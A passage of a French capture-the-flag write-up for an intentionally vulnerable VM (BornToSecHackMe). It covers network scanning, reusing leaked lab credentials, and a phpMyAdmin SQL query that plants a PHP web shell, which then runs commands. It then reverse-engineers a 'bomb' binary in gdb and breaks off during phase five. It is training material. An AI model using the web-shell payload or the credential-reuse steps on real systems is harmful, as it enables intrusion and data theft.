# Writeup1

## Pré-requis

Avant de commencer cet _exploit_, vérifiez que ces pré-requis sont présents :

- Une machine virtuelle : au choix `VMware` ou `VirtualBox`. Nous avons préféré `VMware`.
- `nmap` : faites `brew install nmap`, l'installation prend une dizaine de minutes.
- python 3.x.

## Préliminaires

> __Avertissement__ : l'adresse IP présente dans ce writeup est un exemple, elle peut changer.

Lancez la VM.

Les étapes suivantes sont reprises dans le `script1.sh`.

Un `ifconfig` nous permet de voir les IPs disponibles sur notre machine.

```bash
$> ifconfig
[...]
vmnet8: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
	ether 00:50:56:c0:00:08
	inet 192.168.85.1 netmask 0xffffff00 broadcast 192.168.85.255
```

`vmnet8` correspond à notre machine virtuelle. Dans l'exemple précédent l'IP correspondante est `192.168.85.1`. Nous allons utiliser le logiciel `nmap` pour tester les derniers octets de l'IP - de 1 à 255, et trouver les ports qui sont utilisés :

```bash
$> nmap 192.168.85.1-255
[...]
Nmap scan report for 192.168.85.1
Host is up (0.00015s latency).
Not shown: 969 closed ports, 28 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
111/tcp open  rpcbind
668/tcp open  mecomm

Nmap scan report for 192.168.85.136
Host is up (0.00050s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
[...]
```

Nous constatons que l'IP `192.168.85.136` possède de multiples ports ouverts : `ssh`, `http`, `https`, `imap`, etc. Vous pouvez tester dans un navigateur d'aller voir `http://192.168.85.136` : une page statique s'affiche mais rien d'intéressant à en tirer.

Afin d'avoir une idée plus précise de l'architecture du site, nous utilisons le logiciel `dirb` qui va tester de multiple chemins et nous retourner ceux qui ne renvoient pas d'erreurs.

Nous lançons le programme dirb qui prends deux arguments :

```bash
$> ./dirb https://192.168.85.136/ dirb222/wordlists/common.txt
[...]
---- Scanning URL: https://192.168.85.136/ ----
+ https://192.168.85.136/cgi-bin/ (CODE:403|SIZE:291)
==> DIRECTORY: https://192.168.85.136/forum/
==> DIRECTORY: https://192.168.85.136/phpmyadmin/
+ https://192.168.85.136/server-status (CODE:403|SIZE:296)
==> DIRECTORY: https://192.168.85.136/webmail/
[...]
```

Grâce à cela, nous pouvons voir que le serveur a un `/forum`, un `/phpmyadmin` et un `/webmail`. De plus, nous avons accès directement à plusieurs dossiers et sous-dossiers.

## Le forum

Rendez vous sur le forum : `https://192.168.85.136/forum`. `lmezard` a posté un topic : `Probleme login ?`. En observant les informations, nous constatons que le mot `password` revient souvent. En faisant une recherche dessus nous repérons une ligne particulière :

```text
[...]
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
[...]
```

`!q\]Ej?*5K5cy*AJ` correspond au mot de passe de `lmezard` ! Connectez vous à l'aide de ces identifiants et rendez-vous dans le panneau de configuration. Nous pouvons récupérer son mail : `laurie@borntosec.net`. Il y a sûrement quelque chose à tenter avec ce dernier puisque nous savons que le serveur possède un protocole mail `imap`.

## Le mail

Rendez vous maintenant sur le webmail : `https://192.168.85.136/webmail`. Nous savons que son mail est `laurie@borntosec.net`. Se pourrait-il que cet utilisateur utilise le même mot de passe que pour le forum ?! Oui ! L'erreur de Laurie aura été de garder le même mot de passe sur le forum et sur sa boîte mail... Connectez-vous avec : `!q\]Ej?*5K5cy*AJ`.

Nous tombons sur un mail `DB Access`. Dans ce mail, le login `root` et le password `Fg-'kKXBj87E:aJ$` sont laissés en clair. Nous pouvons tranquillement nous connecter à PhpMyAdmin, c'est du propre !

## PhpMyAdmin

Connectez vous à `https://192.168.85.136/phpmyadmin` avec les informations ci-dessus.

Nous avons la possibilité de faire une injection SQL. Cliquez sur l'onglet SQL et copiez/collez la ligne suivante :

```sql
select "<? System($_REQUEST['cmd']); ?>" into outfile "/var/www/forum/templates_c/inject.php";
```

En utilisant les informations données par `dirb` et en testant différents dossiers nous trouvons un sous-dossier libre d'accès : `/var/www/forum/templates_c/`.

Cette injection SQL va nous permettre ensuite d'exécuter des commandes shells directement dans la barre de navigation comme celle-ci : `https://192.168.85.136/forum/templates_c/inject.php?cmd=ls%20/home`. Nous pouvons ainsi explorer les dossiers et fichiers qui se trouvent sur le serveur.

En rentrant cela dans votre barre de navigation :

```
https://192.168.85.136/forum/templates_c/inject.php?cmd=cat%20/home/LOOKATME/password
```

Vous découvrez de nouvelles informations intéressantes : `lmezard:G!@M6f4Eatau{sF"`. Cela ressemble beaucoup à un identifiant et un mot de passe, n'est-ce-pas ?

## La VM

Vous pouvez maintenant vous connecter à la VM. Un fichier `fun` est présent et un `README`. Nous allons modifier les droits d'accès afin de récupérer ce fichier :

```bash
$> cd ..
$> chmod 777 lmezard
$> cd lmezard
$> chmod 777 fun
```

Vous pouvez maintenant récupérer son contenu sur votre Mac en utilisant l'injection SQL `https://192.168.85.136/forum/templates_c/inject.php?cmd=cat%20/home/lmezard/fun` qui affichera le contenu. Il suffit de le copier/coller dans un nouveau fichier `fun.c`.

## fun

### main

C'est un vrai bazard ! Après un peu d'investigation et de nettoyage du fichier nous obtenons la fonction `main` qui suit :

```C
int main()
{
    printf("M");
    printf("Y");
    printf(" ");
    printf("P");
    printf("A");
    printf("S");
    printf("S");
    printf("W");
    printf("O");
    printf("R");
    printf("D");
    printf(" ");
    printf("I");
    printf("S");
    printf(":");
    printf(" ");
    printf("%c",getme1());
    printf("%c",getme2());
    printf("%c",getme3());
    printf("%c",getme4());
    printf("%c",getme5());
    printf("%c",getme6());
    printf("%c",getme7());
    printf("%c",getme8());
    printf("%c",getme9());
    printf("%c",getme10());
    printf("%c",getme11());
    printf("%c",getme12());
    printf("\n");
    printf("Now SHA-256 it and submit");
}
```

### getme

Nous avons donc 12 fonctions `getme` qui renvoient un caractère.

En utilisant la fonction `grep` sur un fichier `fun` un minimum propre nous trouvons :

```C
char getme8() { return 'w'; }
char getme9() { return 'n'; }
char getme10() { return 'a'; }
char getme11() { return 'g'; }
char getme12() { return 'e'; }
```

Ces fonctions sont faciles à comprendre. Cependant, il nous manque 7 autres `getme`. Les suivantes sont un poil plus compliquées à interpréter. Par exemple, nous avons :

```C
getme6() { //file521ft_fun/AW0DQ.pcap0000640000175000001440000000003412563172202012520 0ustar nnmusers}
```

Nous constatons qu'il y a un commentaire avec une mention `file521`. En cherchant la ligne où se situe `file522` nous obtenons :

```bash
$> grep -in file522 fun_formatted.c
888:void useless() { //file406ft_fun/T7VV0.pcap0000640000175000001440000000002712563172202012534 0ustar nnmusers	return 'r'; //file369ft_fun/KV7B9.pcap0000640000175000001440000000005312563172202012507 0ustar nnmusers	printf("Hahahaha Got you!!!\n"); //file23ft_fun/J5LKW.pcap0000640000175000001440000000002712563172202012542 0ustar nnmusers	return 't'; //file522ft_fun/KVYKW.pcap0000640000175000001440000000005312563172202012620 0ustar nnmusers	printf("Hahahaha Got you!!!\n"); //file45ft_fun/GXPKY.pcap0000640000175000001440000000003412563172202012606 0ustar nnmusers}
```

Nous constatons qu'il y a un `return 't'` juste avant `//file522`. Cela correspond à notre `getme6()` ! De la même manière, nous trouvons :

```C
char getme1() { return 'I'; }
char getme2() { return 'h'; }
char getme3() { return 'e'; }
char getme4() { return 'a'; }
char getme5() { return 'r'; }
char getme6() { return 't'; }
char getme7() { return 'p'; }
```

Ce qui nous donne `Iheartpwnage` que nous hashons en `sha256` : `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`.

Vous pouvez donc vous connecter en `ssh` avec le login `laurie` et le mot de passe au-dessus :

```bash
$> ssh laurie@192.168.85.136
```

## Bomb

Une fois connecté, vous vous retrouvez avec une `bomb` à désamorcer. C'est un exécutable qui semble prendre plusieurs mots de passe et l'ensemble de ces mots de passe nous donnerons le mot de passe `ssh` pour le compte `thor`.

Nous allons effectuer plusieurs étapes pour trouver les mots de passe qui permettent de désamorcer la bombe. Parfois simplement en explorant le binaire ou bien en faisant un peu de _reverse-engineering_. Pour se faire, nous utiliserons quatre outils utiles :

- `gdb` : le débugueur GNU, extrêmement pratique pour suivre notre programme,
- `objdump -t` : nous révèle les symboles,
- `objdump -d` : affiche le code assembleur,
- `strings` : affiche tout ce qui peut l'être à partir de notre binaire.

### 1ère étape

En explorant le binaire (notamment en faisant `objdump -d bomb`), nous constatons la présence de `<phase_1>`, `<phase_2>`, etc. qui se succèdent dans `<main>`. Cela correspond aux différentes étapes à passer.

L'étude de cette fonction nous montre le modèle suivant : la fonction prend une _string_ et la stock dans un registre pour la comparer à une autre _string_ présente à une certaine adresse. Nous pouvons donc aller voir quelle est cette chaîne de caractères :

```bash
$> gdb bomb
[...]
(gdb) break phase_1
Breakpoint 1 at 0x8048b26
(gdb) run
Starting program: /home/laurie/bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
test

Breakpoint 1, 0x08048b26 in phase_1 ()
(gdb) p/x $eax
$1 = 0x804b680
(gdb) x /25c 0x804b680
0x804b680 <input_strings>:	116 't'	101 'e'	115 's'	116 't'	0 '\000'	0 '\000'	0 '\000'	0 '\000'
0x804b688 <input_strings+8>:	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'
0x804b690 <input_strings+16>:	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'	0 '\000'
0x804b698 <input_strings+24>:	0 '\000'
(gdb) x /25c 0x80497c0
0x80497c0:	80 'P'	117 'u'	98 'b'	108 'l'	105 'i'	99 'c'	32 ' '	115 's'
0x80497c8:	112 'p'	101 'e'	97 'a'	107 'k'	105 'i'	110 'n'	103 'g'	32 ' '
0x80497d0:	105 'i'	115 's'	32 ' '	118 'v'	101 'e'	114 'r'	121 'y'	32 ' '
0x80497d8:	101 'e'
```

Nous avons donc une comparaison avec une _string_ qui ressemble à "Public speaking is very e". Un simple `strings bomb | grep P` nous permet de tomber sur cette _string_ : `Public speaking is very easy.` !

### 2ème étape

En observant `<phase_2>` avec `objdump -d bomb`, nous notons un appel à la fonction `<read_six_numbers>`. Cette fonction vérifie que l'entrée correspond à 6 _integers_ séparés par des espaces.

Dans `gdb`, nous pouvons donc fixer un _breakpoint_ sur `<phase_2>` et puis faire un `disas` qui va nous afficher le code assembleur de la fonction :

```
Dump of assembler code for function phase_2:
   0x08048b48 <+0>:	push   %ebp
   0x08048b49 <+1>:	mov    %esp,%ebp
   0x08048b4b <+3>:	sub    $0x20,%esp
   0x08048b4e <+6>:	push   %esi
   0x08048b4f <+7>:	push   %ebx
   0x08048b50 <+8>:	mov    0x8(%ebp),%edx
   0x08048b53 <+11>:	add    $0xfffffff8,%esp
   0x08048b56 <+14>:	lea    -0x18(%ebp),%eax
   0x08048b59 <+17>:	push   %eax
   0x08048b5a <+18>:	push   %edx
   0x08048b5b <+19>:	call   0x8048fd8 <read_six_numbers>
   0x08048b60 <+24>:	add    $0x10,%esp
   0x08048b63 <+27>:	cmpl   $0x1,-0x18(%ebp)
   0x08048b67 <+31>:	je     0x8048b6e <phase_2+38>
   0x08048b69 <+33>:	call   0x80494fc <explode_bomb>
   0x08048b6e <+38>:	mov    $0x1,%ebx
   0x08048b73 <+43>:	lea    -0x18(%ebp),%esi
   0x08048b76 <+46>:	lea    0x1(%ebx),%eax
   0x08048b79 <+49>:	imul   -0x4(%esi,%ebx,4),%eax
   0x08048b7e <+54>:	cmp    %eax,(%esi,%ebx,4)
   0x08048b81 <+57>:	je     0x8048b88 <phase_2+64>
   0x08048b83 <+59>:	call   0x80494fc <explode_bomb>
   0x08048b88 <+64>:	inc    %ebx
   0x08048b89 <+65>:	cmp    $0x5,%ebx
   0x08048b8c <+68>:	jle    0x8048b76 <phase_2+46>
   0x08048b8e <+70>:	lea    -0x28(%ebp),%esp
   0x08048b91 <+73>:	pop    %ebx
   0x08048b92 <+74>:	pop    %esi
   0x08048b93 <+75>:	mov    %ebp,%esp
   0x08048b95 <+77>:	pop    %ebp
   0x08048b96 <+78>:	ret
End of assembler dump.
```

Nous constatons qu'il y a deux appels à `<explode_bomb>`. Le premier se fait après une comparaison (`cmpl`) entre la valeur à l'adresse `%ebp - 0x18` et la valeur fixe `$0x1`. Cela veut dire que c'est une comparaison à `1` ! Nous avons notre premier nombre.

Un peu avant le second appel à `<explode_bomb>` nous remarquons une multiplication signée, `imul`. Le résultat de la multiplication est stocké dans `%eax` qui est ensuite comparé à une autre valeur. Donc, la valeur se trouve dans `%eax` au niveau de cette ligne :

```
0x08048b7e <+54>:	cmp    %eax,(%esi,%ebx,4)
[...]
(gdb) i r eax
eax            0x2	2
```

Donc la valeur suivante est `2` ! Comme nous avons une boucle à `phase_2+68`, nous pouvons procéder ainsi pour en déduire tous les nombres : `6`, `24`, `120` et `720`. Cette suite que nous avons sous les yeux est une suite de nombres factoriels :

```
1! = 1
2! = 1 * 2 = 2
3! = 1 * 2 * 3 = 6
4! = 1 * 2 * 3 * 4 = 24
5! = 1 * 2 * 3 * 4 * 5 = 120
6! = 1 * 2 * 3 * 4 * 5 * 6 = 720
```

Nous avons donc la suite suivante en mot de passe pour `phase_2` : `1 2 6 24 120 720`.

### 3ème étape

Voici un _dump_ de `phase_3` :

```
Dump of assembler code for function phase_3:
   0x08048b98 <+0>:	push   %ebp
   0x08048b99 <+1>:	mov    %esp,%ebp
   0x08048b9b <+3>:	sub    $0x14,%esp
   0x08048b9e <+6>:	push   %ebx
   0x08048b9f <+7>:	mov    0x8(%ebp),%edx
   0x08048ba2 <+10>:	add    $0xfffffff4,%esp
   0x08048ba5 <+13>:	lea    -0x4(%ebp),%eax
   0x08048ba8 <+16>:	push   %eax
   0x08048ba9 <+17>:	lea    -0x5(%ebp),%eax
   0x08048bac <+20>:	push   %eax
   0x08048bad <+21>:	lea    -0xc(%ebp),%eax
   0x08048bb0 <+24>:	push   %eax
   0x08048bb1 <+25>:	push   $0x80497de
   0x08048bb6 <+30>:	push   %edx
   0x08048bb7 <+31>:	call   0x8048860 <sscanf@plt>
   0x08048bbc <+36>:	add    $0x20,%esp
   0x08048bbf <+39>:	cmp    $0x2,%eax
   0x08048bc2 <+42>:	jg     0x8048bc9 <phase_3+49>
   0x08048bc4 <+44>:	call   0x80494fc <explode_bomb>
   0x08048bc9 <+49>:	cmpl   $0x7,-0xc(%ebp)
   0x08048bcd <+53>:	ja     0x8048c88 <phase_3+240>
   0x08048bd3 <+59>:	mov    -0xc(%ebp),%eax
   0x08048bd6 <+62>:	jmp    *0x80497e8(,%eax,4)
   0x08048bdd <+69>:	lea    0x0(%esi),%esi
   0x08048be0 <+72>:	mov    $0x71,%bl
   0x08048be2 <+74>:	cmpl   $0x309,-0x4(%ebp)
   0x08048be9 <+81>:	je     0x8048c8f <phase_3+247>
   0x08048bef <+87>:	call   0x80494fc <explode_bomb>
   0x08048bf4 <+92>:	jmp    0x8048c8f <phase_3+247>
   0x08048bf9 <+97>:	lea    0x0(%esi,%eiz,1),%esi
   0x08048c00 <+104>:	mov    $0x62,%bl
   0x08048c02 <+106>:	cmpl   $0xd6,-0x4(%ebp)
   0x08048c09 <+113>:	je     0x8048c8f <phase_3+247>
   0x08048c0f <+119>:	call   0x80494fc <explode_bomb>
   0x08048c14 <+124>:	jmp    0x8048c8f <phase_3+247>
   0x08048c16 <+126>:	mov    $0x62,%bl
   0x08048c18 <+128>:	cmpl   $0x2f3,-0x4(%ebp)
   0x08048c1f <+135>:	je     0x8048c8f <phase_3+247>
   0x08048c21 <+137>:	call   0x80494fc <explode_bomb>
   0x08048c26 <+142>:	jmp    0x8048c8f <phase_3+247>
   0x08048c28 <+144>:	mov    $0x6b,%bl
   0x08048c2a <+146>:	cmpl   $0xfb,-0x4(%ebp)
   0x08048c31 <+153>:	je     0x8048c8f <phase_3+247>
   0x08048c33 <+155>:	call   0x80494fc <explode_bomb>
   0x08048c38 <+160>:	jmp    0x8048c8f <phase_3+247>
   0x08048c3a <+162>:	lea    0x0(%esi),%esi
   0x08048c40 <+168>:	mov    $0x6f,%bl
   0x08048c42 <+170>:	cmpl   $0xa0,-0x4(%ebp)
   0x08048c49 <+177>:	je     0x8048c8f <phase_3+247>
   0x08048c4b <+179>:	call   0x80494fc <explode_bomb>
   0x08048c50 <+184>:	jmp    0x8048c8f <phase_3+247>
   0x08048c52 <+186>:	mov    $0x74,%bl
   0x08048c54 <+188>:	cmpl   $0x1ca,-0x4(%ebp)
   0x08048c5b <+195>:	je     0x8048c8f <phase_3+247>
   0x08048c5d <+197>:	call   0x80494fc <explode_bomb>
   0x08048c62 <+202>:	jmp    0x8048c8f <phase_3+247>
   0x08048c64 <+204>:	mov    $0x76,%bl
   0x08048c66 <+206>:	cmpl   $0x30c,-0x4(%ebp)
   0x08048c6d <+213>:	je     0x8048c8f <phase_3+247>
   0x08048c6f <+215>:	call   0x80494fc <explode_bomb>
   0x08048c74 <+220>:	jmp    0x8048c8f <phase_3+247>
   0x08048c76 <+222>:	mov    $0x62,%bl
   0x08048c78 <+224>:	cmpl   $0x20c,-0x4(%ebp)
   0x08048c7f <+231>:	je     0x8048c8f <phase_3+247>
   0x08048c81 <+233>:	call   0x80494fc <explode_bomb>
   0x08048c86 <+238>:	jmp    0x8048c8f <phase_3+247>
   0x08048c88 <+240>:	mov    $0x78,%bl
   0x08048c8a <+242>:	call   0x80494fc <explode_bomb>
   0x08048c8f <+247>:	cmp    -0x5(%ebp),%bl
   0x08048c92 <+250>:	je     0x8048c99 <phase_3+257>
   0x08048c94 <+252>:	call   0x80494fc <explode_bomb>
   0x08048c99 <+257>:	mov    -0x18(%ebp),%ebx
   0x08048c9c <+260>:	mov    %ebp,%esp
   0x08048c9e <+262>:	pop    %ebp
   0x08048c9f <+263>:	ret
End of assembler dump.
```

Nous pouvons constater un appel à `sscanf` ce qui est intéressant car elle prend en argument un _input string_ et un _format string_. Le _format string_ se trouve dans le registre `edx` et l'_input string_ ressemble à cela :

```
(gdb) x/s 0x80497de
0x80497de:	 "%d %c %d"
(gdb) i r edx
edx            0x804b720	134526753
(gdb) x/s 0x804b720
0x804b720 <input_strings+160>:	 "test"
```

Nous savons alors que le mot de passe contiendra : un `int`, un `char` et un `int`.
Nous pouvons relancer ainsi gdb avec ces paramètres : `1 a 2`.

```
(gdb) x/10i $pc
=> 0x8048b9f <phase_3+7>:	mov    0x8(%ebp),%edx
   0x8048ba2 <phase_3+10>:	add    $0xfffffff4,%esp
   0x8048ba5 <phase_3+13>:	lea    -0x4(%ebp),%eax
   0x8048ba8 <phase_3+16>:	push   %eax
   0x8048ba9 <phase_3+17>:	lea    -0x5(%ebp),%eax
   0x8048bac <phase_3+20>:	push   %eax
   0x8048bad <phase_3+21>:	lea    -0xc(%ebp),%eax
   0x8048bb0 <phase_3+24>:	push   %eax
   0x8048bb1 <phase_3+25>:	push   $0x80497de
   0x8048bb6 <phase_3+30>:	push   %edx
```

Le premier int est comparé avec 8, si notre int est inférieur à 8 alors rien ne se passe mais dans le cas contraire nous allons dans la fonction `explode_bomb`.

Ensuite, nous allons voir une instruction `jmp` qui jumpera à l'offset de la valeur stocké dans la mémoire `*0x80497e8(,%eax,4)`. Le contenu de `%ebp - 0xc` est la valeur de notre premier `int`, dans notre cas : `1`.

```
(gdb) until *0x08048bc9
0x08048bc9 in phase_3 ()
(gdb) x/10i $pc
=> 0x8048bc9 <phase_3+49>:	cmpl   $0x7,-0xc(%ebp)
   0x8048bcd <phase_3+53>:	ja     0x8048c88 <phase_3+240>
   0x8048bd3 <phase_3+59>:	mov    -0xc(%ebp),%eax
   0x8048bd6 <phase_3+62>:	jmp    *0x80497e8(,%eax,4)
   0x8048bdd <phase_3+69>:	lea    0x0(%esi),%esi
   0x8048be0 <phase_3+72>:	mov    $0x71,%bl
   0x8048be2 <phase_3+74>:	cmpl   $0x309,-0x4(%ebp)
   0x8048be9 <phase_3+81>:	je     0x8048c8f <phase_3+247>
   0x8048bef <phase_3+87>:	call   0x80494fc <explode_bomb>
   0x8048bf4 <phase_3+92>:	jmp    0x8048c8f <phase_3+247>
(gdb) i r ebp
ebp            0xbffff6f8	0xbffff6f8
(gdb) x/d (0xbffff6f8 - 0xc)
0xbffff6ec:	1
```

Le saut nous amène alors un peu plus loin :

```
(gdb) until *0x08048bc9
0x08048bc9 in phase_3 ()
(gdb) x/10i $pc
=> 0x8048c00 <phase_3+104>:	mov    $0x62,%bl
   0x8048c02 <phase_3+106>:	cmpl   $0xd6,-0x4(%ebp)
   0x8048c09 <phase_3+113>:	je     0x8048c8f <phase_3+247>
   0x8048c0f <phase_3+119>:	call   0x80494fc <explode_bomb>
```

La troisième valeur, stockée dans `(%ebp - 0x4)` est alors comparé avec `$0xd6` ou `214` en décimal.

```
(gdb) i r ebp
ebp            0xbffff6f8	0xbffff6f8
(gdb) x/d (0xbffff6f8 - 0x4)
0xbffff6f4:	2
(gdb) print/d 0xd6
$1 = 214
```

Nous relançons une troisième fois `gdb` maintenant que nous avons le dernier int, afin de connaître le `char`. Nous pouvons avancer jusqu'à la dernière comparaison. Vérifions le contenu de `%ebp` afin de s'assurer que cela contient bien notre char `a`. Puis le contenu de `%bl`.

```
(gdb) until *0x8048c8f
0x08048c8f in phase_3 ()
(gdb) x/7i $pc
=> 0x8048c8f <phase_3+247>:	cmp    -0x5(%ebp),%bl
   0x8048c92 <phase_3+250>:	je     0x8048c99 <phase_3+257>
   0x8048c94 <phase_3+252>:	call   0x80494fc <explode_bomb>
   0x8048c99 <phase_3+257>:	mov    -0x18(%ebp),%ebx
   0x8048c9c <phase_3+260>:	mov    %ebp,%esp
   0x8048c9e <phase_3+262>:	pop    %ebp
   0x8048c9f <phase_3+263>:	ret
(gdb) i r ebp
ebp            0xbffff6f8	0xbffff6f8
(gdb) x/c (0xbffff6f8 - 0x5)
0xbffff6f3:	97 'a'
(gdb) i r bl
bl             0x62	98
(gdb) print/c 0x62
$2 = 98 'b'
```

Nous avons maintenant nos trois arguments à passer à la bombe à savoir : `1 b 214`.

### 4ème étape

Nous avons le code assembleur suivant :

```
Dump of assembler code for function phase_4:
   0x08048ce0 <+0>:	push   %ebp
   0x08048ce1 <+1>:	mov    %esp,%ebp
   0x08048ce3 <+3>:	sub    $0x18,%esp
   0x08048ce6 <+6>:	mov    0x8(%ebp),%edx
   0x08048ce9 <+9>:	add    $0xfffffffc,%esp
   0x08048cec <+12>:	lea    -0x4(%ebp),%eax
   0x08048cef <+15>:	push   %eax
   0x08048cf0 <+16>:	push   $0x8049808
   0x08048cf5 <+21>:	push   %edx
   0x08048cf6 <+22>:	call   0x8048860 <sscanf@plt>
   0x08048cfb <+27>:	add    $0x10,%esp
   0x08048cfe <+30>:	cmp    $0x1,%eax
   0x08048d01 <+33>:	jne    0x8048d09 <phase_4+41>
   0x08048d03 <+35>:	cmpl   $0x0,-0x4(%ebp)
   0x08048d07 <+39>:	jg     0x8048d0e <phase_4+46>
   0x08048d09 <+41>:	call   0x80494fc <explode_bomb>
   0x08048d0e <+46>:	add    $0xfffffff4,%esp
   0x08048d11 <+49>:	mov    -0x4(%ebp),%eax
   0x08048d14 <+52>:	push   %eax
   0x08048d15 <+53>:	call   0x8048ca0 <func4>
   0x08048d1a <+58>:	add    $0x10,%esp
   0x08048d1d <+61>:	cmp    $0x37,%eax
   0x08048d20 <+64>:	je     0x8048d27 <phase_4+71>
   0x08048d22 <+66>:	call   0x80494fc <explode_bomb>
   0x08048d27 <+71>:	mov    %ebp,%esp
   0x08048d29 <+73>:	pop    %ebp
   0x08048d2a <+74>:	ret
End of assembler dump.
```

Nous voyons qu'il y encore un appel à `sscanf`. Nous pouvons voir quel _input format_, elle prend (même chose qu'en 3ème étape) : `%d`. Nous voyons aussi qu'une nouvelle fonction est appelée : `func4`. `0x08048d1d <+61>:	cmp    $0x37,%eax` : la valeur de retour de `func4` est comparée à `0x37`. Faisons un tour du coup de `func4` pour voir ce qu'elle fait :

```
Dump of assembler code for function func4:
   0x08048ca0 <+0>:	push   %ebp
   0x08048ca1 <+1>:	mov    %esp,%ebp
   0x08048ca3 <+3>:	sub    $0x10,%esp
   0x08048ca6 <+6>:	push   %esi
   0x08048ca7 <+7>:	push   %ebx
   0x08048ca8 <+8>:	mov    0x8(%ebp),%ebx
   0x08048cab <+11>:	cmp    $0x1,%ebx
   0x08048cae <+14>:	jle    0x8048cd0 <func4+48>
   0x08048cb0 <+16>:	add    $0xfffffff4,%esp
   0x08048cb3 <+19>:	lea    -0x1(%ebx),%eax
   0x08048cb6 <+22>:	push   %eax
   0x08048cb7 <+23>:	call   0x8048ca0 <func4>
   0x08048cbc <+28>:	mov    %eax,%esi
   0x08048cbe <+30>:	add    $0xfffffff4,%esp
   0x08048cc1 <+33>:	lea    -0x2(%ebx),%eax
   0x08048cc4 <+36>:	push   %eax
   0x08048cc5 <+37>:	call   0x8048ca0 <func4>
   0x08048cca <+42>:	add    %esi,%eax
   0x08048ccc <+44>:	jmp    0x8048cd5 <func4+53>
   0x08048cce <+46>:	mov    %esi,%esi
   0x08048cd0 <+48>:	mov    $0x1,%eax
   0x08048cd5 <+53>:	lea    -0x18(%ebp),%esp
   0x08048cd8 <+56>:	pop    %ebx
   0x08048cd9 <+57>:	pop    %esi
   0x08048cda <+58>:	mov    %ebp,%esp
   0x08048cdc <+60>:	pop    %ebp
   0x08048cdd <+61>:	ret
End of assembler dump.
```

Décomposons un petit peu cette fonction pour comprendre :

```
0x08048ca8 <+8>:	mov    0x8(%ebp),%ebx
0x08048cab <+11>:	cmp    $0x1,%ebx
0x08048cae <+14>:	jle    0x8048cd0 <func4+48>
```

Nous voyons que la valeur initiale qui se trouve à `%ebp + 0x8` est copiée dans `%ebx`. Puis si cette valeur est inférieure ou égale à `1` et enfin `jump` à `<func4+48>` soit :

```
0x08048cd0 <+48>:	mov    $0x1,%eax
```

Cette ligne se charge d'initialiser `%eax` à la valeur `1`, or `%eax` est la valeur de retour de la fonction `func4`. Si la condition n'est pas remplie le bout de code suivant est exécuté :

```
0x08048cb3 <+19>:	lea    -0x1(%ebx),%eax
0x08048cb6 <+22>:	push   %eax
0x08048cb7 <+23>:	call   0x8048ca0 <func4>
0x08048cbc <+28>:	mov    %eax,%esi
0x08048cbe <+30>:	add    $0xfffffff4,%esp
0x08048cc1 <+33>:	lea    -0x2(%ebx),%eax
0x08048cc4 <+36>:	push   %eax
0x08048cc5 <+37>:	call   0x8048ca0 <func4>
0x08048cca <+42>:	add    %esi,%eax
```

Nous avons une série d'opérations : `lea` va retrancher `1` à la valeur passée en paramêtre (`%ebx`) et la stocker dans `%eax`. Puis `%eax` est mise de côté sur la stack. Puis on appel de la fonction `func4` avec la nouvelle valeur de `%eax`. Nous voyons que le même processus est répété mais avec après avoir retranché `2` à `%ebx`. Puis nous voyons une addition de `%esi` et `%eax`.

Que se passe-t'il ? Nous pouvons en conclure que la fonction `func4` arrête sa récursive lorsque que la valeur passée en paramêtre - appelons-la `x`, est inférieure ou égale à `1`. À ce moment-là `func4` renvoit la valeur `1`. Nous avons donc un calcul de toutes les valeurs de `x` à `1` en effectuant une récursive `func4(x - 1)` et `func4(x - 2)`. Puis nous faisons la somme des deux - `func4(x - 1) + func4(x - 2)`, et nous renvoyons le résultat à `phase_4`. Cette suite se nomme la suite de Fibonnacci.

De retour dans `phase_4`, nous voyons que le résultat est comparé à la valeur `0x37` :

```
0x08048d1d <+61>:	cmp    $0x37,%eax
```

Or `0x37` vaut `55` en décimal. Dans la suite de Fibonnacci, que nous désignerons par `F`, `F(10) == 55`. Voici un petit tableau qui résume la suite :

 F(0)| F(1) | F(2) | F(3) | F(4) | F(5) | ... | F(10)
-----|------|------|------|------|------|-----|-------
 0   |  1   |  1   |  2   |  3   |  5   | ... |  55

Dans notre fonction `func4` nous avons vu que si `x <= 1` alors `func4` retourne `1`. Ce qui veut dire que la suite démarre à F(1). Ce qui signifie qu'il y a un décalage de `-1`. Donc comme `F(1)` équivaut à `F(0)` alors `F(10)` correspond à `F(9)` et donc `x` vaut `9` !

Le 4ème mot de passe est donc simplement : `9`.

### 5ème étape

Nous commencons par ```disas phase_5``` et observons ce qu'il se passe.
Nous savons que notre chaîne de caractères doit contenir 6 caractères car un _cmp_ est effectué avec 6 et le retour d'une fonction qui compte le nombre de caractères de notre argument.

Ensuite, en parcourant chaque opération, nous voyons qu'un registre _%edx_ est incrémenté à `<phase_5 + 57>`, suivi d'une instruction jump-less-than juste après qui nous ramène à `<phase_5 + 43>`.
Une boucle est en train de se produire. Et, comme on peut le voir sur la structure `<phase_5 + 58>`, la boucle itère 6 fois.
Étant donné que notre chaîne comporte 6 caractères, il est logique de supposer que la fonction parcourt chaque caractère de la boucle et fait vraisemblablement quelque chose avec eux.

Enfin, nous pouvons voir en bas de la fonction que `<strings_not_equal>` est appelé après que le contenu de _%eax_ et l'adresse fixe `0x804980b` ait été poussés sur la stack.
Le code compare la chaîne (probablement notre entrée) stockée dans _%eax_ à une chaîne fixe stockée à `0x804980b`.

On run avec '123456' en argument et regardons ce qu\'il ce passe.

```
[...]
0x08048d72 <+70>:	push   $0x804980b
0x08048d77 <+75>:	lea    -0x8(%ebp),%eax
=> 0x08048d7a <+78>:	push   %eax
0x08048d7b <+79>:	call   0x8049030 <strings_not_equal>
0x08048d80 <+84>:	add    $0x10,%esp
0x08048d83 <+87>:	test   %eax,%eax
0x08048d85 <+89>:	je     0x8048d8c <phase_5+96>
0x08048d87 <+91>:	call   0x80494fc <explode_bomb>
0x08048d8c <+96>:	lea    -0x18(%ebp),%esp
0x08048d8f <+99>:	pop    %ebx
0x08048d90 <+100>:	pop    %esi
